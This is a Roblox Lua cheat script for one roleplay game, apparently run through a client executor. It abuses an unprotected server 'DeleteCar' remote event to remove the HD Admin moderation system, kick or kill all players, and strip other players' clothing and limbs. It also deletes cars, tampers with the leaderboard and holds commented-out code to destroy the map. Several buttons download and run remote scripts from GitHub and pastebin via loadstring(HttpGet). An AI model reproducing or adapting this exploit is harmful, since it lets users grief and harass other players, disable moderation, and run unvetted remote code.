if game.PlaceId == 93903714374388 then
    local PLAYERS = game:GetService("Players")
    local LIGHTING = game:GetService("Lighting")
    local TEXTCHATSERVICE = game:GetService("TextChatService")
    local REPLICATEDSTORAGE = game:GetService("ReplicatedStorage")
    local SCREENGUI = game:GetService("StarterGui")
    local STARTERPLAYER = game:GetService("StarterPlayer")
    local RAYFIELD = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

    local localPlayer = PLAYERS.LocalPlayer
    local deleteEvent = REPLICATEDSTORAGE:WaitForChild('DeleteCar')

    local cars = {}
    local teleport = {}

    local teleportBack = true
    local selectedCar

    local function notACharacter(part)
        if part:IsA('Model') then
            local result = true
            for _, v in pairs(PLAYERS:GetPlayers()) do
                if part.Name == v.Name then
                    result = false
                end
            end
            return result
        end
    end

    local function teloportTo(part)
        if part then
            localPlayer.Character:MoveTo(part.CFrame.Position + Vector3.new(0, 2.75+part.Size.Y/2, 0))
        end
    end

    local function becomePartOfATeam(team)
        if teleportBack then
            local lastCFrame = localPlayer.Character.HumanoidRootPart.CFrame
            REPLICATEDSTORAGE:WaitForChild("TeamsRE"):FireServer(team)
            localPlayer.CharacterAdded:Once(function(character)localPlayer.Character:WaitForChild('HumanoidRootPart').CFrame=lastCFrame end)
        else REPLICATEDSTORAGE:WaitForChild("TeamsRE"):FireServer(team)end
    end

    local function spawnACar()--Patriot DPS 'КамАЗ 65115'
        REPLICATEDSTORAGE:WaitForChild("SpawnCar"):FireServer(selectedCar)
    end

    local function finalOutput(instance)
        print(instance.Name..' was deleted in '..instance:GetFullName())
    end

    local function deleteACar(mode)
        if mode == 0 then
            for _, v in pairs(workspace:GetChildren()) do
                if v:IsA('Model') and string.find(v.Name, 'sCar') then
                    deleteEvent:FireServer(v)
                    task.wait()
                end
            end
        elseif mode == 1 then--Maxsim34503sCar
            for _, v in pairs(game:GetService("Players"):GetPlayers()) do
                local car = workspace:FindFirstChild(v.Name..'sCar')
                if car then
                    deleteEvent:FireServer(car)
                    task.wait()
                end
            end
        else
            for _, v in pairs(workspace:GetChildren()) do
                if v:IsA('Model') and v.Name == localPlayer.Name..'sCar' then
                    deleteEvent:FireServer(v)
                    task.wait()
                end
            end
        end
    end

    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA('SpawnLocation') then
            if not v.Name == 'SpawnLocation' then return end
            if v.TeamColor == BrickColor.new('Forest green') then teleport.defaultSpawn = v
            elseif v.TeamColor == BrickColor.new('Really red') then teleport.criminalSpawn = v
            elseif v.TeamColor == BrickColor.new('Really blue') then teleport.policeSpawn = v
            elseif v.TeamColor == BrickColor.new('Deep orange') then teleport.emergenceSpawn = v
            elseif v.TeamColor == BrickColor.new('New Yeller') then teleport.taxiSpawn = v end-->
        elseif v:IsA('Part') then
            if v.Position == Vector3.new(411.6749572753906, 10.12499713897705, -155.85000610351562) then
                teleport.garages = v
            elseif v.Position == Vector3.new(49.419212341308594, 11.409276962280273, 70.3260498046875) then
                teleport.hospital = v
            elseif v.Position == Vector3.new(54.65410614013672, 12.144861221313477, 432.7012939453125) then
                teleport.school = v
            elseif v.Position == Vector3.new(-779.0899658203125, 10.637853622436523, 174.56324768066406) then
                teleport.storage = v
            elseif v.Position == Vector3.new(-797.6505126953125, 7.749991416931152, -423.87042236328125) then
                teleport.fishing = v
            elseif v.Position == Vector3.new(-511.69989013671875, 15.911480903625488, 936.2000732421875) then
                teleport.trainStation1 = v
            elseif v.Position == Vector3.new(-3355.934814453125, 16.2115535736084, 1846.817138671875) then
                teleport.trainStation2 = v
            elseif v.Position == Vector3.new(-3187.59423828125, 10.370031356811523, 743.4171142578125) then
                teleport.rural = v
            elseif v.Position == Vector3.new(-3211.529296875, 10.600032806396484, 755.6580200195312) then
                teleport.ruralShop = v
            elseif v.Position == Vector3.new(-290.4661865234375, 10.863554000854492, 1750.0054931640625) then
                teleport.checkpoint = v
            elseif v.Position == Vector3.new(-1829.929931640625, 30, 500.3626403808594) then
                teleport.field = v --Wrong coords
            end
        elseif v:IsA('MeshPart') then
            if v.Position == Vector3.new(-2826.895751953125, 30.337114334106445, 483.8316955566406) then
                teleport.forest = v
            end
        end
    end

    if SCREENGUI:FindFirstChild('ScreenGui') and SCREENGUI.ScreenGui:FindFirstChild('Frame') then
        for i, v in pairs(SCREENGUI.ScreenGui.Frame:GetChildren())do cars[i] = v.Name end
        selectedCar = cars[1]
    end
    
    local window = RAYFIELD:CreateWindow({
        Name="Your boss in RP Village",LoadingTitle="RolePlay Village Script",LoadingSubtitle="by KrazyToolThera",Theme="Default",
        DisableRayfieldPrompts=false,DisableBuildWarnings=false,ConfigurationSaving = {Enabled=true,FolderName='RolePlay_Village_OP',FileName ="Save"},KeySystem = false,
    })

    local localTab = window:CreateTab('Local', 'navigation')
    local section = localTab:CreateSection('Optimization')
    local button = localTab:CreateButton({
        Name = "Remove trash from Workspace",
        Callback = function()
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA('RemoteEvent') and v.Name == 'BikeDestroy' then
                    v:Destroy()
                end
            end
        end,
     })
    local toggle = localTab:CreateToggle({
        Name = "Optimaze the game",
        CurrentValue = false,
        Callback = function(value)
            if value then
                LIGHTING.Technology = Enum.Technology.Legacy
                LIGHTING.GlobalShadows = false
                LIGHTING.EnvironmentDiffuseScale = 0
                LIGHTING.EnvironmentSpecularScale = 0
                LIGHTING.ShadowSoftness = 0

                for _,v in pairs(game.Lighting:GetChildren()) do
                    v:Destroy()
                end
            end
        end,
    })

    local teleportTab = window:CreateTab('Teleport', 'server')
    local section = teleportTab:CreateSection('Spawns')
    local button = teleportTab:CreateButton({Name='Citizens Spawn [Граждане]',Callback=function()teloportTo(teleport.defaultSpawn)end,})
    local button=teleportTab:CreateButton({Name='Criminal Spawn [ОПГ]',Callback=function()teloportTo(teleport.criminalSpawn)end,})
    local button=teleportTab:CreateButton({Name='Police Spawn [ГИБДД]',Callback=function()teloportTo(teleport.policeSpawn)end,})
    local button=teleportTab:CreateButton({Name='Emergencal Spawn [МЧС]',Callback=function()teloportTo(teleport.emergenceSpawn)end,})
    local button=teleportTab:CreateButton({Name='Taxi Spawn [Такси]',Callback=function()teloportTo(teleport.taxiSpawn)end,})

    local section=teleportTab:CreateSection('Main')
    local button=teleportTab:CreateButton({Name='Hospital',Callback=function()teloportTo(teleport.hospital)end,})
    local button=teleportTab:CreateButton({Name='School',Callback=function()teloportTo(teleport.school)end,})
    local button=teleportTab:CreateButton({Name='Garages',Callback=function()teloportTo(teleport.garages)end,})
    local button=teleportTab:CreateButton({Name='Storage',Callback=function()teloportTo(teleport.storage)end,})
    --local button=teleportTab:CreateButton({Name='Gas Station',Callback=function()teloportTo(teleport.gasStation)end,})
    local button=teleportTab:CreateButton({Name='Checkpoint [КПП]',Callback=function()teloportTo(teleport.checkpoint)end,})
    local button=teleportTab:CreateButton({Name='Train Station Village',Callback=function()teloportTo(teleport.trainStation1)end,})
    local button=teleportTab:CreateButton({Name='Train Station City',Callback=function()teloportTo(teleport.trainStation2)end,})
    --local button=teleportTab:CreateButton({Name='Wildberries',Callback=function()teloportTo(teleport.wildberries)end,})
    --local button=teleportTab:CreateButton({Name='Hotel',Callback=function()teloportTo(teleport.hotel)end,})
    --local button=teleportTab:CreateButton({Name='McDonald\'s',Callback=function()teloportTo(teleport.mcdonald)end,})
    --local button=teleportTab:CreateButton({Name='Burger King',Callback=function()teloportTo(teleport.burgerKing)end,})
    local button=teleportTab:CreateButton({Name='Rular',Callback=function()teloportTo(teleport.rural)end,})
    local button=teleportTab:CreateButton({Name='Rular Shop',Callback=function()teloportTo(teleport.ruralShop)end,})
    local button=teleportTab:CreateButton({Name='Forest',Callback=function()teloportTo(teleport.forest)end,})
    local button=teleportTab:CreateButton({Name='Field',Callback=function()teloportTo(teleport.field)end,})
    local button=teleportTab:CreateButton({Name='Fishing',Callback=function()teloportTo(teleport.fishing)end,})
    
    local serverTab = window:CreateTab('Server', 'map-pin')
    local section = serverTab:CreateSection('Must have')
    local button = serverTab:CreateButton({Name = 'Remove HD Admin [Admins can\'t do anything] (You can do it only once)',
        Callback = function()
            if _G.BreakHdAdmin then return end _G.BreakHdAdmin=true
            if workspace:FindFirstChild('HD Admin')then deleteEvent:FireServer(workspace['HD Admin'])end
            if workspace:FindFirstChild('HDAdminWorkspaceFolder')then deleteEvent:FireServer(workspace.HDAdminWorkspaceFolder)end

            local x = Instance.new('Folder')x.Name = 'HDAdminServer'x.Parent = game:GetService("ServerScriptService")deleteEvent:FireServer(x)x:Destroy()
            local y = Instance.new('Folder')x.Name = 'HDAdminMapBackup'x.Parent = game:GetService("ServerScriptService")deleteEvent:FireServer(y)y:Destroy()

            for _, v in pairs(game:GetService('ReplicatedFirst'):GetChildren()) do deleteEvent:FireServer(v)end
            if REPLICATEDSTORAGE:FindFirstChild('HDAdminSetup') then deleteEvent:FireServer(REPLICATEDSTORAGE.HDAdminSetup)end
            if REPLICATEDSTORAGE:FindFirstChild('HDAdminClient') then deleteEvent:FireServer(REPLICATEDSTORAGE.HDAdminClient)end
            if REPLICATEDSTORAGE:FindFirstChild('TopbarPlusReference') then deleteEvent:FireServer(REPLICATEDSTORAGE.TopbarPlusReference)end
            if game:GetService('StarterGui'):FindFirstChild('HDAdminGUIs') then deleteEvent:FireServer(game:GetService('StarterGui').HDAdminGUIs)end
            if STARTERPLAYER.StarterCharacterScripts:FindFirstChild('HDAdminStarterCharacter') then
             deleteEvent:FireServer(game.StarterPlayer.StarterCharacterScripts.HDAdminStarterCharacter)end
            if STARTERPLAYER.StarterPlayerScripts:FindFirstChild('HDAdminStarterPlayer') then
             deleteEvent:FireServer(game.StarterPlayer.StarterPlayerScripts.HDAdminStarterPlayer)end
            
            print('😎 HD Admin was removed :)')
        end,
    })
    local button=serverTab:CreateButton({Name='Remove all Cars',Callback=function()deleteACar(0)end,})--
    local keybind=serverTab:CreateKeybind({Name='Keybind',CurrentKeybind='X',HoldToInteract=false,Flag='KeyBindRemoveAllCars',Callback=function()deleteACar(0)end,})
    local button=serverTab:CreateButton({Name='Remove Players Cars',Callback=function()deleteACar(1)end,})--
    local keybind = serverTab:CreateKeybind({Name='Keybind',CurrentKeybind='Z',HoldToInteract=false,Flag='KeyBindPlayersCars',Callback=function()deleteACar(1)end,})

    local section=serverTab:CreateSection('Teams')
    local button=serverTab:CreateButton({Name='Become a Citizen',Callback=function()becomePartOfATeam('Граждане')end})--
    local keybind=serverTab:CreateKeybind({Name='Keybind',CurrentKeybind='R',HoldToInteract=false,Flag='KeyBindCitizen',Callback=function()becomePartOfATeam('Граждане')end,})
    local button=serverTab:CreateButton({Name="Become a Hamster Criminal",Callback=function()becomePartOfATeam('ОПГ')end,})--
    local keybind=serverTab:CreateKeybind({Name='Keybind',CurrentKeybind='T',HoldToInteract=false,Flag='KeyBindCitizen',Callback=function()becomePartOfATeam('ОПГ')end,})
    local button=serverTab:CreateButton({Name='Become a Policeman',Callback=function()becomePartOfATeam('ГИБДД')end,})--
    local keybind=serverTab:CreateKeybind({Name='Keybind',CurrentKeybind='Y',HoldToInteract=false,Flag='KeyBindCitizen',Callback=function()becomePartOfATeam('ГИБДД')end,})
    local button=serverTab:CreateButton({Name='Become a Emergencal Agent',Callback=function()becomePartOfATeam('МЧС')end,})--
    local keybind=serverTab:CreateKeybind({Name='Keybind',CurrentKeybind='U',HoldToInteract = false,Flag='KeyBindCitizen',Callback=function()becomePartOfATeam('МЧС')end,})
    local button=serverTab:CreateButton({Name="Become a Taxi Driver",Callback=function()becomePartOfATeam('Такси')end,})--
    local keybind=serverTab:CreateKeybind({Name='Keybind',CurrentKeybind='P',HoldToInteract=false,Flag='KeyBindCitizen',Callback=function()becomePartOfATeam('Такси')end,})
    local toggle=serverTab:CreateToggle({Name="Teleport Back after You Change a Team",CurrentValue=teleportBack,Flag="TeleportBack",Callback=function(Value)teleportBack=Value end,})

    local section=serverTab:CreateSection('Fun')
    local button=serverTab:CreateButton({Name='Spawn a Car',Callback = function()spawnACar()end,})
    local keybind=serverTab:CreateKeybind({Name='Keybind',CurrentKeybind='G',HoldToInteract=false,Flag='KeyBindSpawnACar',Callback=function()spawnACar()end,})
    local Dropdown=serverTab:CreateDropdown({Name='Select a car',Options=cars,CurrentOption={selectedCar},MultipleOptions=false,Flag='SelectedCar',Callback=function(Options)selectedCar=Options[1]end,})
    local button=serverTab:CreateButton({Name='Delete all Your Cars',Callback=function()deleteACar(2)end,})

    local button = serverTab:CreateButton({
        Name = 'Kick all Players',
        Callback = function()
            for _, v in pairs(PLAYERS:GetChildren()) do
                if v.UserId ~= localPlayer.UserId then
                    deleteEvent:FireServer(v)
                end
            end
            deleteEvent:FireServer(localPlayer)
        end,
    })
    local button = serverTab:CreateButton({Name='Make all Players Invisible',
        Callback=function()for _,v in pairs(game.Players:GetPlayers())do if v.Character:FindFirstChild('LowerTorso')then deleteEvent:FireServer(v.Character.LowerTorso)end end end,})
    local button = serverTab:CreateButton({
        Name = 'Kill a Player',
        Callback = function()
            deleteACar:FireServer(workspace.KARTOHKA_TOP12874.Head)
        end,
    })
    local button = serverTab:CreateButton({
        Name = 'Kill all Players',
        Callback = function()
            for _, v in pairs(game.Players:GetPlayers()) do
                deleteEvent:FireServer(v.Character.Head)
            end
        end,
    })

    local section = serverTab:CreateSection('OverPowered')
    local button=serverTab:CreateButton({
        Name = "Make sb number #1",
        Callback = function()
            local yLevel
            deleteEvent:FireServer(workspace.TimePlayedLeaderboard.TimePlayedClass)
            for _, v in pairs(workspace.TimePlayedLeaderboard.ScoreBlock.Leaderboard.Names:GetChildren()) do
                if v.Text == 'Dima14122005' then
                    yLevel = v.Position.Y.Scale
                else
                    deleteEvent:FireServer(v)
                end
            end
            for _, v in pairs(workspace.TimePlayedLeaderboard.ScoreBlock.Leaderboard.Photos:GetChildren()) do
                if v.Position.Y.Scale ~= yLevel then
                    deleteEvent:FireServer(v)
                end
            end
            for _, v in pairs(workspace.TimePlayedLeaderboard.ScoreBlock.Leaderboard.Score:GetChildren()) do
                if v.Position.Y.Scale ~= yLevel then
                    deleteEvent:FireServer(v)
                end
            end
        end,
    })
    local button=serverTab:CreateButton({
        Name = 'Hacks are Allowed',
        Callback = function()
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA('SurfaceGui')and v.Name == 'SurfaceGui'and v:FindFirstChild('TextLabel')and v.TextLabel:FindFirstChild('TextLabel')
                 and v.TextLabel.TextLabel.Text=='Не злоупотреблять багами и читами'then deleteEvent:FireServer(v) end
            end
        end,
    })
    
    local button=serverTab:CreateButton({
        Name='All Players have noob color',
        Callback=function()
            for _, v in pairs(game.Players:GetPlayers()) do
                if v.Character:FindFirstChild('Body Colors') then
                    deleteEvent:FireServer(v.Character['Body Colors'])
                end
            end
        end,
    })
    local button=serverTab:CreateButton({
        Name='All Players are Armless [Creeper]',
        Callback=function()
            for _,v in pairs(PLAYERS:GetPlayers()) do
                if v.Character:FindFirstChild('RightUpperArm') then
                    deleteEvent:FireServer(v.Character.RightUpperArm)
                end
                if v.Character:FindFirstChild('LeftUpperArm') then
                    deleteEvent:FireServer(v.Character.LeftUpperArm)
                end
            end
        end,
    })
    local button=serverTab:CreateButton({
        Name='All Players are Legless',
        Callback=function()
            for _,v in pairs(PLAYERS:GetPlayers()) do
                if v.Character:FindFirstChild('RightUpperLeg')then deleteEvent:FireServer(v.Character.RightUpperLeg)end
                if v.Character:FindFirstChild('LeftUpperLeg')then deleteEvent:FireServer(v.Character.LeftUpperLeg)end
            end
        end,
    })
    local button=serverTab:CreateButton({
        Name='All Players are Naked',
        Callback=function()
            for _, v in pairs(game.Players:GetPlayers()) do
                if v.Character:FindFirstChild('Shirt')then deleteEvent:FireServer(v.Character.Shirt)end
                if v.Character:FindFirstChild('Pants')then deleteEvent:FireServer(v.Character.Pants)end
                if v.Character:FindFirstChild('Shirt Graphic')then deleteEvent:FireServer(v.Character['Shirt Graphic'])end
                if v.Character:FindFirstChild('Head') and v.Character.Head:FindFirstChild('face')then deleteEvent:FireServer(v.Character.Head.face)end
                for _,y in pairs(v.Character:GetChildren())do if y:IsA('Accessory')then deleteEvent:FireServer(y)end end
            end
        end,
    })
    local button=serverTab:CreateButton({
        Name='Make #1 naked',
        Callback = function()
            --deleteACar:FireServer(workspace.TimePlayedLeaderboard['First Place Avatar'].FirstPlaceTag)
            if workspace:FindFirstChild('TimePlayedLeaderboard') and workspace:FindFirstChild('First Place Avatar') and workspace:FindFirstChild('Rig') then
                local rig = workspace.TimePlayedLeaderboard['First Place Avatar'].Rig

                if rig:FindFirstChild('Pedestal')then deleteACar:FireServer(rig.Pedestal)end
                if rig:FindFirstChild('Pants')then deleteACar:FireServer(rig.Pants)end
                if rig:FindFirstChild('Shirt')then deleteACar:FireServer(rig.Shirt)end

                for _,v in pairs(rig:GetChildren())do if v:IsA('Accessory')then deleteACar:FireServer(v)end end
            end
        end,
    })
    local button=serverTab:CreateButton({Name='Delete the Exploit [Hackers can\'t kick or delete map]',Callback = function()deleteACar:FireServer(game.ReplicatedStorage.DeleteCar)end,})
    -- local button = serverTab:CreateButton({
	-- 	Name = "Destroy the Map",
	-- 	Callback = function()
    --         --if _G.deleteMap then return end
    --         --_G.deleteMap = true

    --         warn('⚠ YOU INITIATED THE MAP DELETION SEQUENCE ⚠')task.wait(1)warn('!YOU CAN\'T UNDO THIS ACTION!')task.wait(1)

    --         local count = 5 repeat task.wait(1) print('The map will be deleted in '..count..' seconds.') count -= 1 until count == 0

    --         if workspace:FindFirstChild('Bloom')then deleteEvent:FireServer(workspace.Bloom)end
    --         if workspace:FindFirstChild('Blur')then deleteEvent:FireServer(workspace.Blur)end
    --         if workspace:FindFirstChild('ColorCorrection')then deleteEvent:FireServer(workspace.ColorCorrection)end
    --         if workspace:FindFirstChild('SunRays')then deleteEvent:FireServer(workspace.SunRays)end

    --         for _,v in pairs(LIGHTING:GetChildren())do deleteEvent:FireServer(v)finalOutput(v)end

    --         for _, v in pairs(workspace:GetChildren()) do
    --             if v:IsA('TextButton') or v:IsA('WedgePart') or v:IsA('TrussPart') or v:IsA('Decal') or v:IsA('RemoteEvent') or v:IsA('MeshPart') or
    --              v:IsA('SpawnLocation') or v:IsA('VehicleSeat') or v:IsA('Seat') or v:IsA('UnionOperation') or v:IsA('Folder') or v:IsA('Part') then
    --                 deleteACar:FireServer(v)
    --                 finalOutput(v)
    --                 task.wait(0.01)
    --             elseif v:IsA('Model') and notACharacter(v) then
    --                 deleteACar:FireServer(v)
    --                 finalOutput(v)
    --                 task.wait(0.01)
    --             end
    --         end

    --         print('The map was deleted successfilly!')
	-- 	end,
	-- })

    local scriptsTab = window:CreateTab('Scripts', 'scroll-text')
    local section=scriptsTab:CreateSection('Good Scripts')
    local button=scriptsTab:CreateButton({Name='Infinite Yield',Callback=function()loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()end,})
    local button=scriptsTab:CreateButton({Name='Infinite Yield: Reborn (Better Version of IY) [Don\'t execute with Infinite Yield]',Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/KrazeToolThera/SecretLua/refs/heads/main/main.lua",true))()end,})
    local button=scriptsTab:CreateButton({Name='Fates Admin',Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))()end,})
    local button=scriptsTab:CreateButton({Name='Orca',Callback=function()loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/latest.lua"))()end,})
    local button=scriptsTab:CreateButton({Name='cOOl Kid',Callback=function()loadstring(game:HttpGet("https://pastebin.com/e36xTVVu"))()end,})
    local button=scriptsTab:CreateButton({Name='Turtle Spy',Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Brand/Turtle-Spy/main/source.lua",true))()end,})
    local button=scriptsTab:CreateButton({Name='Remote Spy',Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()end,})
    local button=scriptsTab:CreateButton({Name='Dex',Callback=function()loadstring(game:HttpGet("https://pastebin.com/raw/M0mPCdD5",true))()end,})
    
    local aboutTab=window:CreateTab('About', 'store')
    local section=aboutTab:CreateSection('The Script')
    local paragraph = aboutTab:CreateParagraph({Title="Changelog",Content =[[
* Fix and add some teleports
* Add script and about section
* Add players functional
    ]]})
    local label=aboutTab:CreateLabel('Version 2.0.1')
    local label=aboutTab:CreateLabel('Executor: '..identifyexecutor())
	local label=aboutTab:CreateLabel('This script made by KrazyToolThera')
    --local label = aboutTab:CreateLabel("Kebabman? Hah?")
    --local TimeOfTheScriptLabel = aboutTab:CreateLabel("Running: "..timeOfTheScript)
    local button=aboutTab:CreateButton({Name='Destroy UI',Callback=function()RAYFIELD:Destroy()end,})

    PLAYERS.PlayerAdded:Connect(function(player)
        if player.UserId == 7560353036 then
            print('Your joined joined you.')
        end
    end)
else warn('Wrong game')end
